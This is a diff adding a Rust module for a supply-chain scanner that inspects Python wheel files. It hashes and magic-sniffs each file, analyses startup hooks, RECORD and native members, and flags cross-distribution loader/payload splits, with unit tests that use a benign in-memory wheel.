@@ -1,0 +1,1214 @@
+//! Artifact I/O: inspect a wheel/sdist FILE and an artifact SET (PR B8).
+//!
+//! A2 classifies a `.whl`/`.so`/... as an `ArtifactCandidate` during collection
+//! but, with no analyzer landed, turns it into an `Unsupported` coverage gap. B8
+//! closes that gap: this module is the I/O entry point that magic-sniffs an
+//! artifact candidate and, for a wheel, runs it through the A4 hardened reader and
+//! the B5/B6/B7 analyzers to produce a real [`ArtifactInspection`] (plus the
+//! per-member native-chain findings B7 decides during byte inspection).
+//!
+//! # Single-artifact ([`inspect_artifact_file`])
+//!
+//! 1. Open the file no-follow within [`ARTIFACT_MAX_FILE_SIZE`] (a wheel ceiling,
+//!    larger than the 10 MiB text cap) ONCE and compute its whole-file SHA-256 from
+//!    a `try_clone` of that handle, then stream the archive from the SAME open file
+//!    description (a single open; no stat-then-reopen TOCTOU window).
+//! 2. Magic-sniff: `PK\x03\x04` (a ZIP local-file header) is a wheel/zip; the gzip
+//!    magic `\x1f\x8b` (a `.tar.gz` sdist) is `Unsupported` this milestone (the
+//!    wheel-only decision); anything else is `Unsupported`.
+//! 3. For a wheel, stream it through [`crate::artifact::archive::read_wheel`] with a
+//!    capturing visitor that (a) collects native handoffs for B7 triage and (b)
+//!    captures the small startup-hook and RECORD member bytes for B5/B6, WITHOUT
+//!    re-opening the archive.
+//! 4. Run B6 ([`crate::artifact::pth::analyze_body`]) over each captured startup
+//!    member and B5 ([`crate::artifact::record::verify_wheel_record`]) over the
+//!    RECORD, folding the signals/edges onto the inspection.
+//!
+//! # Artifact-set ([`inspect_artifact_set`])
+//!
+//! A single wheel cannot show a cross-distribution loader/payload split (one
+//! wheel's `.pth` searches `sys.path` and runs ANOTHER distribution's bundled
+//! script). [`inspect_artifact_set`] is the two-pass model required for criterion
+//! 5: inspect each wheel independently, build a VIRTUAL installation ownership map
+//! across them, resolve cross-artifact references/edges, correlate, and attach each
+//! cross-distribution finding to the LOADER artifact while NAMING the payload.
+
+use std::path::{Path, PathBuf};
+
+use crate::artifact::archive::{
+    self, is_wheel_filename, ArchiveOutcome, MemberVisitor, NativeMemberHandoff,
+};
+use crate::artifact::native::triage_native;
+use crate::artifact::pth::{self, StartupHookKind};
+use crate::artifact::record::verify_wheel_record;
+use crate::artifact::wheel::parse_record;
+use crate::artifact::{
+    ArtifactFileKind, ArtifactInspection, ArtifactSignalKind, DistributionIdentity, EdgeConfidence,
+    ExecutionEdge, ExecutionTrigger, InspectionSubject,
+};
+use crate::location::SubjectLocation;
+use crate::scan::{CoverageGap, CoverageGapKind};
+use crate::util::{self, HashOutcome, OpenRegularError};
+use crate::verdict::Finding;
+
+/// Maximum artifact-file size opened for inspection: 512 MiB, the same ceiling the
+/// A4 reader uses for total uncompressed bytes. Larger than the 10 MiB text-scan
+/// cap (a wheel legitimately bundles compiled extensions), but bounded so a hostile
+/// multi-gigabyte "wheel" cannot drive an unbounded read or hash.
+pub const ARTIFACT_MAX_FILE_SIZE: u64 = 512 * 1024 * 1024;
+
+/// The bytes of a captured small text member (a startup hook or RECORD) plus its
+/// location and kind, collected by [`CapturingVisitor`] during the archive stream
+/// so B5/B6 can analyze them without re-opening the archive.
+struct CapturedMember {
+    location: SubjectLocation,
+    kind: ArtifactFileKind,
+    bytes: Vec<u8>,
+}
+
+/// The visitor B8 passes to [`read_wheel`]: it records native handoffs (for B7) and
+/// the small startup-hook / RECORD member bytes (for B5/B6). The reader has already
+/// enforced every budget before calling, so the captured bytes are bounded.
+#[derive(Default)]
+struct CapturingVisitor {
+    native: Vec<NativeMemberHandoff>,
+    text: Vec<CapturedMember>,
+}
+
+impl MemberVisitor for CapturingVisitor {
+    fn on_native_member(&mut self, handoff: NativeMemberHandoff) {
+        self.native.push(handoff);
+    }
+
+    fn on_text_member(&mut self, location: &SubjectLocation, kind: ArtifactFileKind, bytes: &[u8]) {
+        self.text.push(CapturedMember {
+            location: location.clone(),
+            kind,
+            bytes: bytes.to_vec(),
+        });
+    }
+}
+
+/// The result of inspecting one artifact file: the inspection (with B5/B6 signals
+/// and edges folded in), the per-member B7 native-chain findings, and whether the
+/// archive was structurally REJECTED (a hard violation, not a coverage limit).
+#[derive(Debug, Clone)]
+pub struct InspectedArtifact {
+    /// The populated inspection (signals/edges/files/coverage).
+    pub inspection: ArtifactInspection,
+    /// The per-member Critical native-chain findings B7 triage produced. Carried
+    /// separately because they are decided per member, not from the merged signal
+    /// set; folded into the verdict by
+    /// [`crate::artifact::evaluate_inspected_artifact`].
+    pub native_findings: Vec<Finding>,
+    /// `true` when the archive reader rejected the wheel for a HARD structural
+    /// violation (traversal, collision, encryption, CRC failure, conflicting
+    /// dist-info, identity mismatch). A rejected wheel is not-clean; its
+    /// `inspection` is a best-effort partial for evidence.
+    pub rejected: bool,
+    /// Human-readable descriptions of the structural violations when `rejected`.
+    pub violation_details: Vec<String>,
+}
+
+impl InspectedArtifact {
+    /// The artifact's on-disk filename (for messages), from its subject.
+    pub fn filename(&self) -> Option<&str> {
+        match &self.inspection.subject {
+            InspectionSubject::Artifact(a) => Some(&a.filename),
+            InspectionSubject::GenericArchive(g) => Some(&g.filename),
+            _ => None,
+        }
+    }
+}
+
+/// Why inspecting an artifact file did not produce a wheel inspection. The caller
+/// turns this into a coverage gap (so an artifact is never silently dropped).
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub enum ArtifactInspectError {
+    /// The file could not be opened or read (missing, symlinked final component,
+    /// non-regular, I/O error).
+    Unreadable,
+    /// The file exceeds [`ARTIFACT_MAX_FILE_SIZE`].
+    TooLarge,
+    /// The file is not a wheel/zip (an sdist `.tar.gz`, or an unknown magic). This
+    /// milestone is wheel-only, so these are `Unsupported`, never a false claim of
+    /// coverage.
+    Unsupported,
+}
+
+impl ArtifactInspectError {
+    /// The coverage-gap kind this error maps to.
+    pub fn gap_kind(self) -> CoverageGapKind {
+        match self {
+            ArtifactInspectError::Unreadable => CoverageGapKind::Unreadable,
+            // A too-large artifact is recorded as a hash-budget gap (it is too big to
+            // even hash within budget, so it is security-relevant regardless of ext).
+            ArtifactInspectError::TooLarge => CoverageGapKind::HashBudgetExceeded,
+            ArtifactInspectError::Unsupported => CoverageGapKind::Unsupported,
+        }
+    }
+}
+
+/// Magic-sniff result for an artifact candidate's leading bytes.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+enum ArtifactMagic {
+    /// `PK\x03\x04` / `PK\x05\x06` (empty) / `PK\x07\x08` — a ZIP, i.e. a wheel.
+    Zip,
+    /// `\x1f\x8b` — gzip, i.e. a `.tar.gz` sdist (Unsupported this milestone).
+    Gzip,
+    /// Anything else.
+    Unknown,
+}
+
+/// Sniff the leading bytes for the artifact magic. Safe and bounded (reads the
+/// first 4 bytes only). A wheel/zip starts `PK`; gzip starts `\x1f\x8b`.
+fn sniff_magic(bytes: &[u8]) -> ArtifactMagic {
+    if bytes.len() >= 4
+        && bytes[0] == b'P'
+        && bytes[1] == b'K'
+        && matches!(
+            (bytes[2], bytes[3]),
+            (0x03, 0x04) | (0x05, 0x06) | (0x07, 0x08)
+        )
+    {
+        return ArtifactMagic::Zip;
+    }
+    if bytes.len() >= 2 && bytes[0] == 0x1f && bytes[1] == 0x8b {
+        return ArtifactMagic::Gzip;
+    }
+    ArtifactMagic::Unknown
+}
+
+/// Read the leading magic bytes from an open `Read + Seek` handle and classify
+/// them, leaving the cursor rewound to 0 for the archive reader. A read I/O fault
+/// is [`ArtifactInspectError::Unreadable`], NOT a 0-byte prefix: folding an error
+/// into `n = 0` would sniff `Unknown` and mislabel the file as `Unsupported`, the
+/// same totality slip the seek-error path avoids. A SHORT (but successful) read is
+/// fine — `sniff_magic` simply sees fewer than 4 bytes.
+fn sniff_head<R: std::io::Read + std::io::Seek>(
+    reader: &mut R,
+) -> Result<ArtifactMagic, ArtifactInspectError> {
+    use std::io::SeekFrom;
+    let mut head = [0u8; 4];
+    let n = match reader.read(&mut head) {
+        Ok(n) => n,
+        Err(_) => return Err(ArtifactInspectError::Unreadable),
+    };
+    // Rewind for the archive reader regardless of how many bytes we got.
+    if reader.seek(SeekFrom::Start(0)).is_err() {
+        return Err(ArtifactInspectError::Unreadable);
+    }
+    Ok(sniff_magic(&head[..n]))
+}
+
+/// Inspect one artifact FILE: magic-sniff and, for a wheel, run the A4 reader plus
+/// the B5/B6/B7 analyzers. Returns an [`InspectedArtifact`] on success, or an
+/// [`ArtifactInspectError`] the caller maps to a coverage gap. NEVER panics and
+/// NEVER follows a symlinked final component.
+pub fn inspect_artifact_file(path: &Path) -> Result<InspectedArtifact, ArtifactInspectError> {
+    use std::io::{Seek as _, SeekFrom};
+
+    // Open no-follow with a wheel-appropriate ceiling ONCE. The opener fstat's the
+    // open fd, so an oversized or non-regular file is rejected before any read.
+    let mut archive_file = match util::open_read_no_follow_capped(path, ARTIFACT_MAX_FILE_SIZE) {
+        Ok(f) => f,
+        Err(OpenRegularError::NotFound) | Err(OpenRegularError::NotRegularFile) => {
+            return Err(ArtifactInspectError::Unreadable)
+        }
+        Err(OpenRegularError::TooLarge) => return Err(ArtifactInspectError::TooLarge),
+        Err(OpenRegularError::Io(_)) => return Err(ArtifactInspectError::Unreadable),
+    };
+
+    // Whole-file SHA-256 over THIS open file description (the artifact identity).
+    // We never re-open the path: a `try_clone` (dup(2)) shares the SAME open file
+    // description and the SAME inode we just fstat'd, so the hashed bytes and the
+    // streamed bytes are the same file even if the path is swapped underneath us
+    // (closing the hash-fd vs stream-fd TOCTOU a stat-then-reopen would leave). We
+    // hash the clone (which `sha256_from_handle` consumes), then seek the original
+    // back to 0 and stream the archive from it.
+    let hash_handle = match archive_file.try_clone() {
+        Ok(f) => f,
+        Err(_) => return Err(ArtifactInspectError::Unreadable),
+    };
+    let outer_sha256 = match util::sha256_from_handle(hash_handle, ARTIFACT_MAX_FILE_SIZE) {
+        Ok(HashOutcome::Digest(hex)) => hex,
+        Ok(HashOutcome::BudgetExceeded) => return Err(ArtifactInspectError::TooLarge),
+        Err(_) => return Err(ArtifactInspectError::Unreadable),
+    };
+
+    // Magic sniff the leading bytes (bounded) from the SAME handle, then seek back
+    // to 0 so the archive reader sees the whole file. The hash above may have left
+    // the clone's cursor at EOF, but the clone shares this fd's file offset, so we
+    // seek to 0 here unconditionally before the sniff read.
+    if archive_file.seek(SeekFrom::Start(0)).is_err() {
+        return Err(ArtifactInspectError::Unreadable);
+    }
+    let magic = sniff_head(&mut archive_file)?;
+
+    let outer_name = path
+        .file_name()
+        .and_then(|n| n.to_str())
+        .unwrap_or("artifact")
+        .to_string();
+
+    match magic {
+        ArtifactMagic::Zip if is_wheel_filename(&outer_name) => {
+            inspect_wheel(archive_file, &outer_name, &outer_sha256)
+        }
+        // A `PK` magic but a non-`.whl` name is a generic zip: this milestone does
+        // not inspect generic archives as packages, so it is Unsupported (the A4
+        // reader could read it, but we do not claim package coverage for a plain
+        // zip here).
+        ArtifactMagic::Zip => Err(ArtifactInspectError::Unsupported),
+        // gzip / unknown: wheel-only milestone, so Unsupported (never a false claim
+        // of sdist coverage).
+        ArtifactMagic::Gzip | ArtifactMagic::Unknown => Err(ArtifactInspectError::Unsupported),
+    }
+}
+
+/// Inspect a wheel from an open `Read + Seek` handle: run the A4 reader with the
+/// capturing visitor, then fold the B5/B6/B7 analysis onto the inspection.
+fn inspect_wheel<R: std::io::Read + std::io::Seek>(
+    reader: R,
+    outer_name: &str,
+    outer_sha256: &str,
+) -> Result<InspectedArtifact, ArtifactInspectError> {
+    let mut visitor = CapturingVisitor::default();
+    let outcome = archive::read_wheel(
+        reader,
+        outer_name,
+        outer_sha256,
+        &archive::ArchiveLimits::default(),
+        &mut visitor,
+    );
+
+    let (mut inspection, rejected, violation_details) = match outcome {
+        ArchiveOutcome::Accepted(i) => (i, false, Vec::new()),
+        ArchiveOutcome::Rejected {
+            violations,
+            partial,
+        } => {
+            let details = violations.iter().map(describe_violation).collect();
+            (partial, true, details)
+        }
+    };
+
+    // B6: analyze each captured startup-hook body; B5: verify the wheel RECORD.
+    let mut native_findings: Vec<Finding> = Vec::new();
+    let mut record_entries_bytes: Option<Vec<u8>> = None;
+
+    for captured in &visitor.text {
+        match captured.kind {
+            ArtifactFileKind::PthFile
+            | ArtifactFileKind::StartFile
+            | ArtifactFileKind::SiteCustomize => {
+                fold_startup_member(&mut inspection, captured);
+            }
+            ArtifactFileKind::DistInfoMetadata => {
+                // ONLY the exact RECORD member, not its detached signatures
+                // (`RECORD.jws` / `RECORD.p7s`), which `is_text_member_of_interest` also
+                // captures as DistInfoMetadata. A signature appearing AFTER RECORD in the
+                // central directory would otherwise overwrite the real RECORD bytes, fail
+                // CSV parsing (`record` becomes None), and fire a false RecordMissingFile
+                // on a legitimately signed wheel.
+                let is_record = captured
+                    .location
+                    .member_path
+                    .as_deref()
+                    .map(|m| m.rsplit('/').next().unwrap_or(m) == "RECORD")
+                    .unwrap_or(false);
+                if is_record {
+                    record_entries_bytes = Some(captured.bytes.clone());
+                }
+            }
+            _ => {}
+        }
+    }
+
+    // B5: wheel-RECORD verification against the inspection's hashed members.
+    let record = match &record_entries_bytes {
+        Some(bytes) => {
+            let text = String::from_utf8_lossy(bytes);
+            parse_record(&text).ok()
+        }
+        None => None,
+    };
+    // Only verify a wheel RECORD when the wheel actually has one (an absent RECORD
+    // would emit a spurious MissingRecord violation for a generic zip; for a real
+    // wheel a missing RECORD IS a finding, so we verify whenever the subject is a
+    // wheel artifact).
+    if matches!(inspection.subject, InspectionSubject::Artifact(_)) {
+        let result = verify_wheel_record(&inspection, record.as_deref());
+        inspection.signals.extend(result.signals);
+    }
+
+    // B7: triage each native handoff. The artifact path has no ownership index (a
+    // single wheel is its own distribution), so BOTH `known_malicious_indicator` and
+    // `unowned` are false here; the artifact-set path supplies cross-distribution
+    // corroboration.
+    for handoff in &visitor.native {
+        let triage = triage_native(handoff, false, false);
+        inspection.signals.extend(triage.signals);
+        inspection.execution_edges.extend(triage.edges);
+        if let Some(finding) = triage.finding {
+            native_findings.push(finding);
+        }
+    }
+
+    Ok(InspectedArtifact {
+        inspection,
+        native_findings,
+        rejected,
+        violation_details,
+    })
+}
+
+/// Fold one captured startup-hook member's B6 body analysis onto the inspection:
+/// the granular signals plus the execution edges (a cross-runtime edge when a
+/// foreign runtime is launched, and a generic import edge per executing line).
+fn fold_startup_member(inspection: &mut ArtifactInspection, captured: &CapturedMember) {
+    let kind = match captured.kind {
+        ArtifactFileKind::PthFile => StartupHookKind::Pth,
+        ArtifactFileKind::StartFile => StartupHookKind::Start,
+        ArtifactFileKind::SiteCustomize => StartupHookKind::SiteCustomize,
+        _ => return,
+    };
+    let body = String::from_utf8_lossy(&captured.bytes);
+    let analysis = pth::analyze_body(&body, &captured.location, kind);
+    inspection.signals.extend(analysis.signals);
+
+    if analysis.capabilities.cross_runtime {
+        inspection.execution_edges.push(ExecutionEdge {
+            from: captured.location.clone(),
+            trigger: ExecutionTrigger::CrossRuntimeInvocation,
+            to: SubjectLocation::default(),
+            mechanism: "startup hook launches a foreign language runtime (Bun/Node/Deno)"
+                .to_string(),
+            confidence: EdgeConfidence::High,
+        });
+    }
+    for line in &analysis.lines {
+        if line.class.executes() {
+            inspection.execution_edges.push(ExecutionEdge {
+                from: captured.location.clone(),
+                trigger: kind.trigger(),
+                to: SubjectLocation::default(),
+                mechanism: format!("startup line imports/executes: {}", line.text.trim()),
+                confidence: EdgeConfidence::Medium,
+            });
+        }
+    }
+}
+
+/// A short human description of a structural archive violation (for the rejected
+/// artifact's evidence / CLI output).
+fn describe_violation(v: &archive::ArchiveViolation) -> String {
+    use archive::ArchiveViolation as V;
+    match v {
+        V::PathTraversal { member } => format!("path traversal member: {member}"),
+        V::WindowsPathTraversal { member } => format!("windows-path member: {member}"),
+        V::DuplicatePath {
+            normalized,
+            first,
+            second,
+        } => format!("duplicate path '{normalized}' ({first} vs {second})"),
+        V::EncryptedMember { member } => format!("encrypted member: {member}"),
+        V::CrcMismatch { member } => format!("CRC mismatch: {member}"),
+        V::SymlinkMember { member, target } => format!("symlink member: {member} -> {target}"),
+        V::ConflictingDistInfo { roots } => {
+            format!("conflicting .dist-info roots: {}", roots.join(", "))
+        }
+        V::IdentityMismatch { detail } => format!("identity mismatch: {detail}"),
+        V::MalformedArchive { detail } => format!("malformed archive: {detail}"),
+    }
+}
+
+// ---------------------------------------------------------------------------
+// Artifact-set (cross-distribution) inspection
+// ---------------------------------------------------------------------------
+
+/// A two-pass inspection of a SET of artifacts, for cross-distribution
+/// loader/payload detection (criterion 5). Pass 1 inspects each wheel
+/// independently; pass 2 builds a virtual installation ownership map and resolves
+/// references/edges ACROSS artifacts, attaching each cross-distribution finding to
+/// the LOADER artifact while naming the payload.
+pub struct ArtifactSetInspection {
+    /// Each artifact's independent inspection (pass 1), in input order. A
+    /// per-artifact [`ArtifactInspectError`] (an unreadable / unsupported / oversize
+    /// member of the set) is recorded as a coverage gap rather than dropping the
+    /// whole set.
+    pub members: Vec<ArtifactSetMember>,
+    /// The cross-distribution findings (pass 2), each attached to the loader
+    /// artifact and naming the payload artifact. Reuses the existing RuleIds.
+    pub cross_findings: Vec<Finding>,
+    /// Coverage gaps for set members that could not be inspected (so a set is never
+    /// silently incomplete).
+    pub gaps: Vec<CoverageGap>,
+}
+
+/// One artifact in a set: its on-disk path and its independent inspection result.
+pub struct ArtifactSetMember {
+    /// The artifact's on-disk path.
+    pub path: PathBuf,
+    /// The independent inspection (pass 1).
+    pub inspected: InspectedArtifact,
+}
+
+impl ArtifactSetInspection {
+    /// Every finding in the set: each member's own signal-correlated + native
+    /// findings, plus the cross-distribution findings. Built by re-correlating each
+    /// member (so the per-member native findings are included) and appending the
+    /// cross findings; the caller finalizes this into ONE verdict.
+    pub fn all_findings(&self, threat_db: Option<&crate::threatdb::ThreatDb>) -> Vec<Finding> {
+        let mut findings: Vec<Finding> = Vec::new();
+        for m in &self.members {
+            findings.extend(crate::artifact::correlate::correlate_inspection_findings(
+                &m.inspected.inspection,
+                &m.inspected.native_findings,
+                threat_db,
+            ));
+        }
+        findings.extend(self.cross_findings.iter().cloned());
+        findings
+    }
+}
+
+/// Inspect a SET of artifact files for cross-distribution execution. Pass 1
+/// inspects each independently; pass 2 builds the virtual ownership map and
+/// correlates cross-artifact loader/payload splits.
+pub fn inspect_artifact_set(paths: &[PathBuf]) -> ArtifactSetInspection {
+    // ---- Pass 1: inspect every artifact independently ------------------------
+    let mut members: Vec<ArtifactSetMember> = Vec::new();
+    let mut gaps: Vec<CoverageGap> = Vec::new();
+    for path in paths {
+        match inspect_artifact_file(path) {
+            Ok(inspected) => members.push(ArtifactSetMember {
+                path: path.clone(),
+                inspected,
+            }),
+            Err(e) => gaps.push(CoverageGap {
+                location: SubjectLocation::from_path(path.clone()),
+                kind: e.gap_kind(),
+                sha256: None,
+            }),
+        }
+    }
+
+    // ---- Resolve cross-artifact references and correlate ---------------------
+    // The cross-distribution correlation walks the members directly (every
+    // payload-shaped member of another distribution is treated as reachable when a
+    // loader searches sys.path); it does not consult an ownership map, so none is
+    // built here.
+    let cross_findings = correlate_cross_distribution(&members);
+
+    ArtifactSetInspection {
+        members,
+        cross_findings,
+        gaps,
+    }
+}
+
+/// The distribution identity for a set member (for the virtual ownership map). A
+/// wheel artifact identity becomes a distribution identity keyed by its on-disk
+/// INPUT PATH, not the bare filename: two same-named wheels in different
+/// directories (`a/demo-1.0.whl` and `b/demo-1.0.whl`) must stay distinct
+/// identities so a cross-distribution split between them is not collapsed and
+/// missed. `same_distribution` compares name + this location, so the full path is
+/// what makes them distinguishable.
+fn member_distribution_identity(member: &ArtifactSetMember) -> Option<DistributionIdentity> {
+    match &member.inspected.inspection.subject {
+        InspectionSubject::Artifact(a) => Some(DistributionIdentity {
+            ecosystem: a.ecosystem,
+            name: a.name.clone(),
+            version: a.version.clone(),
+            // No on-disk dist-info dir for an un-installed wheel; use the artifact's
+            // actual input path as the stable identity location so two artifacts
+            // with the SAME filename in different directories stay distinct.
+            dist_info_path: SubjectLocation::from_path(member.path.clone()),
+        }),
+        _ => None,
+    }
+}
+
+/// Correlate cross-distribution execution across the set: a LOADER artifact whose
+/// startup hook (a `.pth`/`.start`/sitecustomize) searches `sys.path` and can run a
+/// PAYLOAD owned by a DIFFERENT artifact. The finding is attached to the loader and
+/// NAMES the payload, reusing the existing startup/native RuleIds (cross-cutting
+/// invariant 1: no new RuleId for the cross-artifact context).
+fn correlate_cross_distribution(members: &[ArtifactSetMember]) -> Vec<Finding> {
+    use crate::verdict::{Evidence, RuleId, Severity};
+    let mut findings: Vec<Finding> = Vec::new();
+
+    for loader in members {
+        let Some(loader_dist) = member_distribution_identity(loader) else {
+            continue;
+        };
+        // A loader is interesting only if it has a startup hook that EXECUTES and
+        // searches sys.path (the mechanism that reaches another distribution's
+        // bundled payload). The B6 signals on the inspection encode this.
+        let has_sys_path_search = loader
+            .inspected
+            .inspection
+            .signals
+            .iter()
+            .any(|s| s.kind == ArtifactSignalKind::PthSysPathSearch);
+        let has_executing_line = loader
+            .inspected
+            .inspection
+            .signals
+            .iter()
+            .any(|s| s.kind == ArtifactSignalKind::PthExecutableLine);
+        if !(has_sys_path_search && has_executing_line) {
+            continue;
+        }
+
+        // Resolve which OTHER artifacts own a payload the loader could reach. We use
+        // the loader's executing startup lines as the reference set: any module-ish
+        // token they name that is owned by a DIFFERENT distribution in the set is a
+        // cross-distribution payload. To stay generic (a rename must not evade), we
+        // also treat ANY payload-shaped member (a script / native / wasm) owned by
+        // another distribution as reachable when the loader searches sys.path.
+        let payload_refs = resolve_cross_payloads(loader, &loader_dist, members);
+        if payload_refs.is_empty() {
+            continue;
+        }
+
+        // One finding per loader, naming every distinct payload artifact reached.
+        let payload_names: Vec<String> = payload_refs
+            .iter()
+            .map(|p| p.payload_artifact.clone())
+            .collect::<std::collections::BTreeSet<_>>()
+            .into_iter()
+            .collect();
+
+        let loader_name = loader
+            .inspected
+            .filename()
+            .unwrap_or("loader artifact")
+            .to_string();
+
+        let mut evidence: Vec<Evidence> = vec![Evidence::Text {
+            detail: format!(
+                "loader artifact '{loader_name}' bundles a startup hook that searches sys.path \
+                 and can execute a payload owned by another distribution in the set: {}",
+                payload_names.join(", ")
+            ),
+        }];
+        for r in &payload_refs {
+            evidence.push(Evidence::Text {
+                detail: format!(
+                    "{} -> {} (payload member: {})",
+                    r.loader_member, r.payload_artifact, r.payload_member
+                ),
+            });
+        }
+
+        // The cross-distribution split is the cross-runtime campaign mechanism.
+        // When the loader ALSO launches a foreign runtime (Bun/Node/Deno), it is the
+        // real campaign signature: Critical, and a hard Block. When it does NOT, the
+        // signal is just "a sys.path-searching, executing startup hook co-inspected
+        // with some payload-shaped member owned by another distribution" — which a
+        // benign wheel shipping a `.so`/`.sh` alongside an unrelated `.pth` can
+        // trip, since the breadth here is intentionally rename-resistant (it does
+        // not require the loader to NAME the payload). So the non-cross-runtime case
+        // is Medium (a Warn), not a hard Block: full evidence is still attached (the
+        // loader and every payload member are named), but it does not block install
+        // without the stronger cross-runtime corroboration. Either way the finding is
+        // attached to the loader and names the payload.
+        let loader_cross_runtime = loader
+            .inspected
+            .inspection
+            .execution_edges
+            .iter()
+            .any(|e| matches!(e.trigger, ExecutionTrigger::CrossRuntimeInvocation));
+
+        let (rule_id, severity) = if loader_cross_runtime {
+            (RuleId::PythonStartupHookCrossRuntime, Severity::Critical)
+        } else {
+            (RuleId::PythonStartupHookSuspicious, Severity::Medium)
+        };
+
+        findings.push(Finding {
+            rule_id,
+            severity,
+            title: "A startup hook executes a payload bundled in another distribution".to_string(),
+            description:
+                "Across the inspected artifact set, one distribution's startup hook searches \
+                 sys.path at interpreter start and can execute a payload bundled in a DIFFERENT \
+                 distribution. This is the cross-distribution loader/payload split used by the \
+                 live supply-chain campaign: the loader wheel looks benign in isolation, and the \
+                 payload wheel is never opened by a single-artifact scan. The finding is attached \
+                 to the loader artifact and names the payload artifact. The detection keys on the \
+                 sys.path-search + cross-distribution-ownership relationship, not on payload \
+                 filenames, so renaming the payload does not evade it. Do not install either \
+                 artifact until both are reviewed."
+                    .to_string(),
+            evidence,
+            human_view: None,
+            agent_view: None,
+            mitre_id: Some("T1546".to_string()),
+            custom_rule_id: None,
+        });
+    }
+
+    findings
+}
+
+/// A resolved cross-distribution payload reference: the loader member that reaches
+/// it, and the payload artifact + member it resolves to.
+struct CrossPayloadRef {
+    loader_member: String,
+    payload_artifact: String,
+    payload_member: String,
+}
+
+/// Resolve the payloads a loader can reach in OTHER distributions of the set. A
+/// loader that searches `sys.path` can run any payload-shaped member (a script,
+/// native module, or wasm) owned by a different distribution; we report each such
+/// member, naming its owning artifact. Generic by construction (no payload-filename
+/// allowlist), so a rename does not evade.
+fn resolve_cross_payloads(
+    loader: &ArtifactSetMember,
+    loader_dist: &DistributionIdentity,
+    members: &[ArtifactSetMember],
+) -> Vec<CrossPayloadRef> {
+    let mut refs: Vec<CrossPayloadRef> = Vec::new();
+
+    // The loader's executing startup lines (the reference site that names the
+    // sys.path search). We attribute the cross reference to the first executing
+    // startup member for the evidence.
+    let loader_member = loader
+        .inspected
+        .inspection
+        .signals
+        .iter()
+        .find(|s| s.kind == ArtifactSignalKind::PthExecutableLine)
+        .map(|s| s.location.to_string())
+        .unwrap_or_else(|| "loader startup hook".to_string());
+
+    for payload in members {
+        let Some(payload_dist) = member_distribution_identity(payload) else {
+            continue;
+        };
+        // Skip the loader itself (a SAME-distribution member is not a
+        // cross-distribution split).
+        if same_distribution(loader_dist, &payload_dist) {
+            continue;
+        }
+        // Any payload-shaped member (script / native / wasm) owned by this other
+        // distribution is reachable by a sys.path-searching loader.
+        for file in &payload.inspected.inspection.files {
+            if is_payload_kind(file.kind) {
+                refs.push(CrossPayloadRef {
+                    loader_member: loader_member.clone(),
+                    payload_artifact: payload
+                        .inspected
+                        .filename()
+                        .unwrap_or("payload artifact")
+                        .to_string(),
+                    payload_member: file.location.to_string(),
+                });
+            }
+        }
+    }
+
+    refs
+}
+
+/// Whether a member kind is a PAYLOAD a cross-distribution loader could execute (a
+/// bundled script, native module, or wasm). Python source is intentionally NOT a
+/// payload kind here: a loader importing a sibling Python module is ordinary; the
+/// campaign's split hands off to a SCRIPT/native runtime, which is what we flag.
+fn is_payload_kind(kind: ArtifactFileKind) -> bool {
+    matches!(
+        kind,
+        ArtifactFileKind::Script | ArtifactFileKind::NativeModule | ArtifactFileKind::WasmModule
+    )
+}
+
+/// Whether two distribution identities are the same artifact in a set (same name +
+/// same identity location).
+fn same_distribution(a: &DistributionIdentity, b: &DistributionIdentity) -> bool {
+    a.name == b.name && a.dist_info_path == b.dist_info_path
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+    use std::io::Write as _;
+    use zip::write::SimpleFileOptions;
+    use zip::ZipWriter;
+
+    /// Build an in-memory wheel zip from (member, body) pairs.
+    fn build_wheel(members: &[(&str, &[u8])]) -> Vec<u8> {
+        let mut zw = ZipWriter::new(std::io::Cursor::new(Vec::new()));
+        for (name, body) in members {
+            zw.start_file(*name, SimpleFileOptions::default()).unwrap();
+            zw.write_all(body).unwrap();
+        }
+        zw.finish().unwrap().into_inner()
+    }
+
+    /// Write `bytes` to a temp file named `name`, returning the path (and keeping
+    /// the tempdir alive via the returned guard).
+    fn write_temp(dir: &tempfile::TempDir, name: &str, bytes: &[u8]) -> PathBuf {
+        let p = dir.path().join(name);
+        std::fs::write(&p, bytes).unwrap();
+        p
+    }
+
+    #[test]
+    fn sniff_recognizes_zip_and_gzip() {
+        assert_eq!(sniff_magic(b"PK\x03\x04rest"), ArtifactMagic::Zip);
+        assert_eq!(sniff_magic(b"PK\x05\x06"), ArtifactMagic::Zip);
+        assert_eq!(sniff_magic(&[0x1f, 0x8b, 0x08, 0x00]), ArtifactMagic::Gzip);
+        assert_eq!(sniff_magic(b"not a zip"), ArtifactMagic::Unknown);
+        assert_eq!(sniff_magic(b""), ArtifactMagic::Unknown);
+    }
+
+    #[test]
+    fn clean_wheel_inspects_to_no_findings() {
+        let dir = tempfile::tempdir().unwrap();
+        let bytes = build_wheel(&[
+            ("demo/__init__.py", b"print('hi')\n"),
+            (
+                "demo-1.0.dist-info/METADATA",
+                b"Metadata-Version: 2.1\nName: demo\nVersion: 1.0\n\n",
+            ),
+            ("demo-1.0.dist-info/WHEEL", b"Wheel-Version: 1.0\n"),
+            (
+                "demo-1.0.dist-info/RECORD",
+                b"demo/__init__.py,sha256=2Vn9kQq8iDQA4F1pHbZ5gQ7Hq6oq7e8gWQ1xMrr0vY,12\n\
+                  demo-1.0.dist-info/RECORD,,\n",
+            ),
+        ]);
+        let path = write_temp(&dir, "demo-1.0-py3-none-any.whl", &bytes);
+        let inspected = inspect_artifact_file(&path).expect("inspect");
+        assert!(!inspected.rejected, "a clean wheel is not rejected");
+        // The clean wheel has a (deliberately wrong) RECORD hash above to keep the
+        // test self-contained; the IMPORTANT invariant is no startup/native finding.
+        let findings = crate::artifact::correlate::correlate_inspection_findings(
+            &inspected.inspection,
+            &inspected.native_findings,
+            None,
+        );
+        assert!(
+            findings.iter().all(|f| f.rule_id
+                != crate::verdict::RuleId::PythonStartupHookSuspicious
+                && f.rule_id != crate::verdict::RuleId::NativeImportExecutionChain),
+            "clean wheel must not fire startup/native findings: {findings:?}"
+        );
+    }
+
+    #[test]
+    fn unsupported_sdist_is_unsupported_error() {
+        let dir = tempfile::tempdir().unwrap();
+        // gzip magic, named .tar.gz
+        let path = write_temp(&dir, "demo-1.0.tar.gz", &[0x1f, 0x8b, 0x08, 0x00, 0, 0]);
+        let err = inspect_artifact_file(&path).unwrap_err();
+        assert_eq!(err, ArtifactInspectError::Unsupported);
